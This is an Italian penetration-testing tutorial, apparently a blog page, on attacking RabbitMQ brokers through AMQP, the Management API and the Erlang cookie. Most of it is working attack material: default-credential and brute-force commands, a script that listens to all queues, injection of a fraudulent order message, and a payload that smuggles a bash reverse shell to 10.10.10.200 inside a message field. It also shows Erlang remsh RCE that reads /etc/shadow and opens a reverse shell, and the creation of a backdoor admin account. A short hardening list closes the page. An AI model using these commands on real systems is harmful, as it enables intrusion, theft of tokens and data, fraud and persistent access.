---
title: 'Porta 5672 RabbitMQ: AMQP, Code e Management API'
slug: porta-5672-rabbitmq
description: >-
  Porta 5672 RabbitMQ nel pentest: code e messaggi AMQP, credenziali esposte,
  Management API 15672, injection e rischio Erlang cookie.
image: /porta-5672-rabbitmq.webp
draft: false
date: 2026-04-14T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - RabbitMQ
  - AMQP
  - Management API
featured: true
---

RabbitMQ è il message broker più diffuso per architetture a microservizi, code di lavoro e comunicazione asincrona tra componenti applicativi. Ascolta sulla porta 5672 TCP (AMQP protocol) e sulla porta 15672 per la Management Web UI. Nel penetration testing, un RabbitMQ compromesso è un finding di alto impatto: i messaggi in transito contengono dati business critici (ordini, pagamenti, notifiche), spesso includono credenziali e token in chiaro, e la manipolazione dei messaggi può alterare il flusso logico dell'applicazione — dall'approvazione fraudolenta di transazioni all'injection di comandi che i consumer eseguono ciecamente.

Il punto debole classico di RabbitMQ è la combinazione letale: **credenziali default `guest:guest`** attive + **Management UI esposta sulla 15672**. Ma anche senza la Management UI, l'accesso AMQP sulla 5672 permette di iscriversi alle code e leggere ogni messaggio che passa.

## Architettura RabbitMQ

```
Producer (App A)                   RabbitMQ (:5672)                 Consumer (App B)
┌──────────────┐                   ┌─────────────────────┐         ┌──────────────┐
│ Invia ordine │── AMQP publish ──►│ Exchange "orders"   │         │ Processa     │
│ {user, total,│                   │   └── Queue "proc"  │── sub──►│ l'ordine     │
│  card_token} │                   │   └── Queue "notify"│── sub──►│ Invia email  │
└──────────────┘                   │                     │         └──────────────┘
                                   │ Management UI       │
                                   │ :15672 (HTTP API)   │
                                   └─────────────────────┘
```

| Porta    | Servizio | Funzione                         |
| -------- | -------- | -------------------------------- |
| **5672** | AMQP     | Protocollo messaging principale  |
| 5671     | AMQPS    | AMQP over TLS                    |
| 15672    | HTTP     | Management Web UI e REST API     |
| 25672    | Erlang   | Comunicazione cluster inter-nodo |
| 4369     | EPMD     | Erlang Port Mapper Daemon        |
| 61613    | STOMP    | Protocollo messaging alternativo |
| 1883     | MQTT     | Protocollo IoT                   |

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 5672,15672,25672,4369 10.10.10.40
```

```
PORT      STATE SERVICE    VERSION
5672/tcp  open  amqp       RabbitMQ 3.12.10
15672/tcp open  http       RabbitMQ Management UI
25672/tcp open  unknown
4369/tcp  open  epmd       Erlang Port Mapper Daemon
```

### Banner AMQP

```bash
# Il protocollo AMQP invia un banner alla connessione
nc -nv 10.10.10.40 5672
```

```
AMQP    3.12.10
```

### Management API (porta 15672)

```bash
curl -s http://10.10.10.40:15672/api/overview -u guest:guest | python3 -m json.tool
```

```json
{
    "management_version": "3.12.10",
    "rabbitmq_version": "3.12.10",
    "erlang_version": "26.1.2",
    "cluster_name": "rabbit@mq-prod-01.corp.internal",
    "node": "rabbit@mq-prod-01"
}
```

**Intelligence:** versione RabbitMQ e Erlang, hostname del nodo (`mq-prod-01.corp.internal`), nome cluster.

## 2. Credential Attack

### Default credentials

RabbitMQ viene installato con un utente `guest` con password `guest` e permessi di **amministratore**. Dalla versione 3.3.0, `guest` può connettersi solo da localhost per la Management UI — ma sulla porta AMQP 5672, il comportamento varia.

| Username   | Password   | Note                                                                                 |
| ---------- | ---------- | ------------------------------------------------------------------------------------ |
| `guest`    | `guest`    | Default, admin completo. Remote login bloccato su 15672 dalla 3.3+ ma testalo sempre |
| `admin`    | `admin`    | Setup custom comune                                                                  |
| `rabbitmq` | `rabbitmq` | Installazioni automatizzate                                                          |

```bash
# Test Management UI
curl -s -u guest:guest http://10.10.10.40:15672/api/whoami
```

```json
{"name":"guest","tags":["administrator"]}
```

`guest:guest` funziona e l'utente è **administrator** → accesso completo.

```bash
# Test AMQP diretto
# Con amqp-tools
amqp-get -u amqp://guest:guest@10.10.10.40:5672/
```

### Brute force

```bash
# Hydra sulla Management UI (HTTP Basic Auth)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.40 http-get /api/whoami -s 15672

# Metasploit
use auxiliary/scanner/amqp/amqp_login
set RHOSTS 10.10.10.40
run
```

### Credenziali da file di configurazione

```bash
# RabbitMQ config
cat /etc/rabbitmq/rabbitmq.conf 2>/dev/null
cat /etc/rabbitmq/rabbitmq-env.conf 2>/dev/null

# Credenziali nelle applicazioni che si connettono a RabbitMQ
grep -riE "amqp://|RABBITMQ_" /opt/ /var/www/ /home/ 2>/dev/null
```

```
# Tipico connection string
amqp://app_user:AppQ_2025!@mq-prod-01.corp.internal:5672/production
```

Connection string con credenziali in chiaro — trovata nei file `.env`, `application.yml`, `docker-compose.yml`, e nei [repository SVN/Git](https://hackita.it/articoli/porta-3690-svn).

## 3. Management API — Enumerazione Completa

Con credenziali valide sulla 15672:

### Utenti e permessi

```bash
curl -s -u guest:guest http://10.10.10.40:15672/api/users | python3 -m json.tool
```

```json
[
    {"name": "guest", "password_hash": "abc123...", "hashing_algorithm": "rabbit_password_hashing_sha256", "tags": ["administrator"]},
    {"name": "app_user", "password_hash": "def456...", "tags": []},
    {"name": "monitoring", "password_hash": "ghi789...", "tags": ["monitoring"]}
]
```

**Password hash** degli utenti esposti → crack offline. Il formato è SHA-256 con salt specifico di RabbitMQ.

### Vhost e code

```bash
# Lista vhost
curl -s -u guest:guest http://10.10.10.40:15672/api/vhosts

# Lista code
curl -s -u guest:guest http://10.10.10.40:15672/api/queues | python3 -m json.tool
```

```json
[
    {"name": "orders.process", "messages": 1523, "consumers": 3, "vhost": "production"},
    {"name": "payments.verify", "messages": 87, "consumers": 1, "vhost": "production"},
    {"name": "notifications.email", "messages": 4521, "consumers": 2, "vhost": "production"},
    {"name": "auth.events", "messages": 234, "consumers": 1, "vhost": "production"}
]
```

Quattro code con messaggi in attesa. `payments.verify` e `auth.events` sono i target più interessanti.

### Exchange e bindings

```bash
curl -s -u guest:guest http://10.10.10.40:15672/api/exchanges
curl -s -u guest:guest http://10.10.10.40:15672/api/bindings
```

Mostra come i messaggi vengono instradati: quale exchange li riceve e a quale coda li invia.

### Connessioni attive

```bash
curl -s -u guest:guest http://10.10.10.40:15672/api/connections | python3 -m json.tool
```

```json
[
    {"user": "app_user", "peer_host": "10.10.10.50", "peer_port": 45678, "ssl": false},
    {"user": "app_user", "peer_host": "10.10.10.51", "peer_port": 45679, "ssl": false}
]
```

IP dei server applicativi che si connettono → nuovi target.

## 4. Intercettazione Messaggi

### Leggere messaggi dalla coda (Management API)

```bash
# Leggi messaggi dalla coda "auth.events" senza consumarli
curl -s -u guest:guest http://10.10.10.40:15672/api/queues/production/auth.events/get \
  -H "Content-Type: application/json" \
  -d '{"count":10, "ackmode":"ack_requeue_true", "encoding":"auto"}'
```

```json
[
    {
        "payload": "{\"event\":\"login_success\",\"user\":\"admin\",\"token\":\"eyJhbGciOiJIUzI1NiJ9...\",\"ip\":\"10.10.10.100\"}",
        "routing_key": "auth.login"
    },
    {
        "payload": "{\"event\":\"password_reset\",\"user\":\"j.smith\",\"reset_token\":\"abc123def456\",\"email\":\"j.smith@corp.com\"}",
        "routing_key": "auth.reset"
    }
]
```

**Gold nei messaggi:**

* **JWT token** dell'utente admin → session hijacking
* **Reset token** → prendi il controllo dell'account j.smith
* Dati di pagamento, ordini, informazioni personali

### Consumer AMQP (intercettazione continua)

```python
#!/usr/bin/env python3
"""Intercetta tutti i messaggi da RabbitMQ"""
import pika

credentials = pika.PlainCredentials('guest', 'guest')
connection = pika.BlockingConnection(
    pika.ConnectionParameters('10.10.10.40', 5672, 'production', credentials)
)
channel = connection.channel()

# Bind a un exchange per ricevere TUTTI i messaggi
channel.exchange_declare(exchange='intercept', exchange_type='fanout')
result = channel.queue_declare(queue='', exclusive=True)
queue_name = result.method.queue

# Bind all'exchange di produzione (cattura copie dei messaggi)
channel.queue_bind(exchange='amq.topic', queue=queue_name, routing_key='#')

def callback(ch, method, properties, body):
    print(f"[{method.routing_key}] {body.decode()}")

channel.basic_consume(queue=queue_name, on_message_callback=callback, auto_ack=True)
print("Intercepting messages...")
channel.start_consuming()
```

Questo script si iscrive a tutti i messaggi con routing key `#` (wildcard) — riceve una copia di tutto ciò che transita.

## 5. Message Injection

### Iniettare messaggi malevoli

```bash
# Pubblica un messaggio nella coda "orders.process"
curl -s -u guest:guest http://10.10.10.40:15672/api/exchanges/production/amq.default/publish \
  -H "Content-Type: application/json" \
  -d '{
    "routing_key": "orders.process",
    "payload": "{\"order_id\":99999,\"user\":\"attacker\",\"total\":0.01,\"status\":\"approved\",\"card\":\"4111111111111111\"}",
    "payload_encoding": "string",
    "properties": {}
  }'
```

Se il consumer processa i messaggi senza validazione → ordine fraudolento approvato.

### Command injection via messaggio

Se il consumer esegue comandi basati sul contenuto del messaggio (pattern comune in job queue):

```bash
# Payload con command injection
curl -s -u guest:guest http://10.10.10.40:15672/api/exchanges/production/amq.default/publish \
  -H "Content-Type: application/json" \
  -d '{
    "routing_key": "jobs.execute",
    "payload": "{\"command\":\"process_report\",\"filename\":\"report.pdf; bash -c '\''bash -i >& /dev/tcp/10.10.10.200/4444 0>&1'\''\"}"
  }'
```

Se il consumer usa il campo `filename` in un comando shell senza sanitizzazione → RCE sul consumer.

## 6. Erlang Cookie — RCE sul Nodo

RabbitMQ gira su Erlang/OTP. I nodi di un cluster Erlang condividono un **cookie** (una stringa segreta) salvata in `/var/lib/rabbitmq/.erlang.cookie` (o `~/.erlang.cookie`). Se ottieni il cookie, puoi connetterti al nodo Erlang e eseguire codice arbitrario.

### Trovare il cookie

```bash
# Se hai accesso al filesystem (LFI, NFS, iSCSI)
cat /var/lib/rabbitmq/.erlang.cookie
```

```
XYZSECRETCOOKIEVALUE
```

### RCE via Erlang remsh

```bash
# Connettiti al nodo Erlang con il cookie rubato
erl -name attacker@10.10.10.200 -setcookie XYZSECRETCOOKIEVALUE -remsh rabbit@mq-prod-01
```

Ora hai una shell Erlang sul nodo RabbitMQ:

```erlang
% Esegui un comando OS
os:cmd("id").
% "uid=999(rabbitmq) gid=999(rabbitmq)\n"

os:cmd("cat /etc/shadow").

% Reverse shell
os:cmd("bash -c 'bash -i >& /dev/tcp/10.10.10.200/4444 0>&1'").
```

RCE completa come utente `rabbitmq`.

### EPMD (porta 4369)

```bash
# Enumera nodi Erlang registrati
epmd -names -port 4369
```

```
name rabbit at port 25672
```

Conferma il nome del nodo (`rabbit`) e la porta di distribuzione (25672) — necessari per la connessione remsh.

## 7. Creare Utenti Backdoor

```bash
# Crea un nuovo admin
curl -s -u guest:guest -X PUT http://10.10.10.40:15672/api/users/backdoor \
  -H "Content-Type: application/json" \
  -d '{"password":"B4ckD00r!","tags":"administrator"}'

# Dai permessi su tutti i vhost
curl -s -u guest:guest -X PUT http://10.10.10.40:15672/api/permissions/production/backdoor \
  -H "Content-Type: application/json" \
  -d '{"configure":".*","write":".*","read":".*"}'
```

## 8. Detection & Hardening

* **Elimina o disabilita `guest`** — mai lasciare le credenziali default
* **Password forti** per tutti gli utenti
* **Non esporre 15672 su Internet** — Management UI solo da rete di management
* **TLS sulla 5672** (AMQPS su 5671) — messaggi in chiaro sulla 5672 sono intercettabili
* **Vhost separati** per applicazioni diverse con permessi minimi
* **Erlang cookie robusto** — `openssl rand -hex 32 > ~/.erlang.cookie`
* **Firewall** — 5672 solo da app server, 25672/4369 solo tra nodi cluster
* **Non mettere credenziali nei messaggi** — usa riferimenti (ID sessione, non il token)
* **Monitora** creazione utenti, nuovi consumer e volumi anomali

## 9. Cheat Sheet Finale

| Azione         | Comando                                                                             |
| -------------- | ----------------------------------------------------------------------------------- |
| Nmap           | `nmap -sV -p 5672,15672,25672,4369 target`                                          |
| Default creds  | `curl -u guest:guest http://target:15672/api/whoami`                                |
| Lista utenti   | `curl -u user:pass http://target:15672/api/users`                                   |
| Lista code     | `curl -u user:pass http://target:15672/api/queues`                                  |
| Leggi messaggi | `curl -u user:pass .../queues/vhost/queue/get -d '{"count":10,...}'`                |
| Connessioni    | `curl -u user:pass http://target:15672/api/connections`                             |
| Pubblica msg   | `curl -u user:pass .../exchanges/vhost/exchange/publish -d '{...}'`                 |
| Crea admin     | `curl -X PUT .../api/users/backdoor -d '{"password":"...","tags":"administrator"}'` |
| EPMD           | `epmd -names -port 4369`                                                            |
| Erlang RCE     | `erl -name a@IP -setcookie COOKIE -remsh rabbit@node`                               |
| Hydra          | `hydra -l admin -P wordlist target http-get /api/whoami -s 15672`                   |

***

Riferimento: RabbitMQ Security documentation, Erlang distribution protocol, HackTricks RabbitMQ. Uso esclusivo in ambienti autorizzati. [https://hackviser.com/tactics/pentesting/services/rabbitmq](https://hackviser.com/tactics/pentesting/services/rabbitmq)

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
